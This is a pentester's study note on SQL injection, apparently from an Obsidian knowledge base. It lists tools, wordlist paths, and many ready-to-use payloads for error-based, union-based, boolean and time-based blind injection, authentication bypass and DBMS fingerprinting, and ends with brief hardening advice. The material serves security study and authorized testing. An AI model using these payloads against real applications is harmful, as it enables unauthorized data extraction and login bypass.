---
tags:
  - "#type/tech-specific" 
  - "#attack/execution/server-side"  #attack/exfiltration #attack/credential-access 
---
# Fundamentals

SQL Basics: [[2 Tech-Specifics/Database/Overview - Database|Overview - Database]]

**Attack Surface:**

- every user-controlled input, that is then used in a database query
- depending on what is done with the user input, different types of SQLi might be possible. For example: authentication bypass, data exfiltration, etc. - see below:

**There are several basic types of SQL injection:**

Each type can be possible in a distinct application context and also leads to distinct impact.

- [[#In-Band SQL Injection]]: might be possible if the website returns data based on the query
	- [[#Error-Based]]: if error messages are returned to the user
	- [[#Union-Based]]: if query results are returned to the user. e.g. search fields
- [[#Blind SQL Injection]]: might be possible if no data is returned, but some other properties (e.g. time delays) can be used as indicator
	- [[#Boolean-based SQL Injection]]: if something changes if the query is true/false
	- [[#Time-based SQL Injection]]: if a delay can indicate it the query is true/false
- [[#Out of Band SQL Injection]]: might be possible if data is / can be returned to the attacker using another medium
- [[#Authentication Bypass]]: might be possible on authentication forms
- [[#Code Execution]]: depends on the DBMS configuration

### Impacts:

- reading/writing data in the database
- reading/writing files on the target system
- code execution - e.g. by creating a webshell

# Pentesting

## Automated Testing

Fast, works well, but VERY noisy

**Tools:**

- [[3 Tools/database/sqlmap|sqlmap]]: auto enumeration + exploitation
- [[3 Tools/web/OWASP ZAP|OWASP ZAP]]: auto enumeration of a whole webapp
- [ffuf]: fuzzing of single parameters

**Wordlists:**

- `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt`
- `/usr/share/seclists/Fuzzing/SQLi/Generic-BlindSQLi.fuzz.txt`
- `/usr/share/wordlists/wfuzz/injections/SQL.txt`

## Manual Testing

Can be a lot stealthier than automated testing.

**Generic Workflow**

1. find all input fields on the website
2. initially check each field if it is vulnerable to SQLi - see [[#Initial Discovery Payloads]]
3. confirm the type of sqli and weaponize it according to its type:
	- see overview in [[#Fundamentals]]
	- see [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/) and [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html) for great explanations and snippets
4. Enumerate the DBMS - see [[2 Tech-Specifics/Database/Standard SQL Cheat Sheet|Standard SQL Cheat Sheet]], [[#Implementation Specific Methods]] and
	1. enumerate existing databases
	2. enumerate tables of databases
	3. enumerate schema/columns of databases
	4. extract data

> [!Hint]
> All sql injection payloads use the following **basic structure**:
> - single `'` or `"` to end the string passed to the sql query
> - then either continue the query eg. with an`OR` or `UNION` statement or if the db allows stacked queries concatenate another query:
> 	- end a query with `;` then add the next query (e.g. `select` some data)
> - always end by commenting the rest of the legitimate query in the backend out: `-- //`
> 	- Note: the `//` helps to keep the necessary whitespace, even if the webapp truncates whitepace at the end of the input

### Initial Discovery Payloads

```
'
''
"
`
')
")
`)
'))
"))
`))
;
\
```

### Generic Methods

Bypass filters using [[2 Tech-Specifics/Web/Attacks - Web/Injection Attacks/Filter Bypassing - Injection|Filter Bypassing - Injection]]

#### In-Band SQL Injection

##### Error-Based

Occurs when error messages are directly returned to the user

**Workflow:**

1. **Discovery:** break SQL query until an error message is produced
2. Verify that actual data is returned, by using `version()` or `database()` as injected query
3. If you found a working injection point enumerate & extract data as described in the [[#Manual Testing]] workflow
	- e.g. `' OR 1=1 in (SELECT * FROM users) -- //` to dump the whole "users" table from the present database
	- if that does not work, query one column at a time - e.g. ` or 1=1 in (SELECT id FROM users) -- //`

**Discovery Payloads:**

For [[2 Tech-Specifics/Database/MySQL|MySQL]]:

```

' OR 1=1 in (SELECT <injected_query>)-- //
' AND extractvalue(1, concat(0x3a, <injected_query>))-- //

```

For [[2 Tech-Specifics/Database/MSSQL|MSSQL]] and [[2 Tech-Specifics/Database/PostgreSQL|PostgreSQL]]:

```
' select cast(<injected_query> as integer)-- //
```

Trying to cast the return-value of `version()` to an integer results in an error showing the DBMS type and version.

##### Union-Based

- See [[2 Tech-Specifics/Database/Standard SQL Cheat Sheet#UNION|Standard SQL Cheat Sheet]]
- inject a `union` + `select` to concatenate additional data to the legitimate results
- most common way to extract large amounts of data, but the structure of the legitimate output must be matched.

**Workflow:**

you must satisfy the two conditions of the [[2 Tech-Specifics/Database/Standard SQL Cheat Sheet#UNION|UNION Statement]]

1. the number of columns must match
	- use `' ORDER BY <NUMBER> -- //` to find out the number of columns
		- this statement sorts the result by the supplied column number - if the column does not exist, it fails --> start with 1 and iterate
		- alternatively, use `%' UNION SELECT 'a1' -- //` and successively add columns
2. the datatype of each column must match the one of the legitimate data
	- use `%' UNION SELECT 'a1', 'a2', 'a3', 'a`...`' -- //`to see which column is represented where in the output
	- the you can try to infer the datatype from the data and match columns in the union statement accordingly
Based on that information, craft the union statement - use `null`to not add data to a specific column
- e.g. show database information: `' UNION SELECT database(), user(), null, @@version, null -- //`
- e.g. show tables and their columns in the active database: `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
- Inn [[2 Tech-Specifics/Database/MySQL|MySQL]] e.g. use `(SELECT group_concat(<column_names> SEPARATOR '\n'aa) from ... where ...)` to concatenate multiple query results into one string within one column

> [!Hint] Hint
> While testing make sure the legitimate results are shown, e.g. by providing a valid query or a wild card query (`%`).

**Discovery Payloads:**

```
' ORDER BY 1 -- //
' UNION SELECT NULL -- //
' UNION SELECT NULL,NULL -- //
' UNION SELECT NULL,NULL,NULL -- //
```

#### Blind SQL Injection

##### Boolean-based SQL Injection

**Workflow:**

1. find something on the website that changes if the query is true/false.
2. then you can start enumerating and building the sql query step by step:
	1. check how many colums the current table has `%' UNION SELECT 1;--`, iteratively add columns 1,2,3,... until it shows true
	2. follow the generic workflow in [[#Manual Testing]]

**Example:**`%' UNION SELECT 1,2,3 where database() like 's%';--`

- try different characters in the like statement to find out the first character, then continue with the second character,...
- later on the statement looks like this: `%' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
**Hint:** You can also use the `substring()` function to iteratively enumerate a value. E.g. `substring(database(),1,1) = 'i'` and later `substring(database(),1,5) = 'infor'`

**Discovery Payloads:**

```sql
' AND '1'='1
' AND '1'='2
1 AND 1=1
1 AND 1=2
```

##### Time-based SQL Injection

**Workflow:**

the sleep() function is used - it is only executed upon a successful UNION statement -> you can check if your query is true based on the resulting delay

1. eg. start with finding out the number of columns: `%' UNION SELECT SLEEP(5),2;--`
	- alternatively, in [[2 Tech-Specifics/Database/MySQL|MySQL]] you can also use an IF statement: `IF(2>1, sleep(5), "NO");`
2. as with boolean based SQLi, craft the query step by step
3. later the statement looks like this: `%' UNION SELECT SLEEP(5),2 from users where username='admin' and password like 'a%';`

Sometimes it helps to combine a query result with a known true or false condition using boolean operators: e.g. `user=test' AND IF(1=1, SLEEP(3),0) -- //`

**Discovery Payloads:**

```
' OR SLEEP(5) -- //
'; WAITFOR DELAY '0:0:5' -- //
'; SELECT pg_sleep(5) -- //
```

#### Out of Band SQL Injection

medium to send queries and to receive information is not the same

1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.
2. The Website makes an SQL query to the database which also passes the hacker's payload.
3. The payload contains a code that forces an HTTP request back to the hacker's machine containing data from the database.

#### Authentication Bypass

databases often just check if the credentials are a valid pair (can be found in a table) and then return true/false

example query that a vulnerable website might issue in case of a successful SQLi:

```sql
select * from users where username='' and password='' OR 1=1; -- //
``` 

(in the password field the input was `' OR 1=1; -- //`, which always returns true)

**Discovery Payloads:**

```
admin' -- //
' OR 1=1 -- //
') OR ('1'='1 -- //
' OR 'x'='x
```

#### Code Execution

Depends on the DBMS in use - see [[#Implementation specific methods]].

### Implementation Specific Methods

The exact sql syntax e.g. code execution techniques vary for different databases - check: [[2 Tech-Specifics/Database/Overview - Database#Implementation Specifics|Overview - Database]]

### DBMS fingerprinting

**Payloads:**

```
' UNION SELECT @@version -- //        (MySQL/MSSQL)
' UNION SELECT version() -- //        (PostgreSQL)
' UNION SELECT sqlite_version() -- // (SQLite)
```

# Hardening

1. prepared queries: SQL queries are prepared and the use input is just filled in
2. input validation: allow-list on user input characters
3. escaping user input: puts a `\` before any special characters -> they are interpreted as normal string
